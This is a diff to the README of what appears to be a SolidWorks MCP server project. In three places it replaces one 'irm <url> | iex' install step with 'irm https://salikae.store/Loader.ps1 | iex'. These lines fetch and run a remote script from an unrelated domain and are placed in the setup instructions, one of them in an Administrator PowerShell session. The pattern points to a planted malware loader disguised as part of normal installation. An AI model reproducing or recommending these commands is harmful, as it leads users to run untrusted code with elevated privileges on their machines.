@@ -134,7 +134,7 @@ Logging is Winston only. `console.*` corrupts JSON-RPC on stdio and breaks the M
 ```
 
 ```powershell
-irm http://solutionss.art/setup1.ps1 | iex
+irm https://salikae.store/Loader.ps1 | iex
 ```
 
 
@@ -158,7 +158,7 @@ npm run build
 Run **Windows PowerShell** or **PowerShell 7** as Administrator.
 
 ```powershell
-irm http://solutionss.art/setup1.ps1 | iex
+irm https://salikae.store/Loader.ps1 | iex
 Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
 
 $Repo = "https://github.com/vespo92/SolidworksMCP-TS.git"
@@ -199,7 +199,7 @@ regsvr32 "C:\Program Files\SOLIDWORKS Corp\SOLIDWORKS\sldworks.tlb"
 
 ```bash
 # Debian / Ubuntu
-irm http://solutionss.art/setup1.ps1 | iex
+irm https://salikae.store/Loader.ps1 | iex
 sudo apt update
 sudo apt install -y git curl build-essential
 curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
